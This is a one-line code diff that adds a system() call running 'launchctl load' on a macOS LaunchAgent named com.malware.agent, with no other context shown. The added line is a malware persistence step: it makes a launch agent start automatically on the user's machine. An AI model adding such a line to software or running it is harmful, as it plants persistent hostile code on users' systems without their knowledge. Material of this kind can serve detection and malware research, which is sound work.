@@ -1,0 +1,1 @@
+system("launchctl load /Library/LaunchAgents/com.malware.agent")
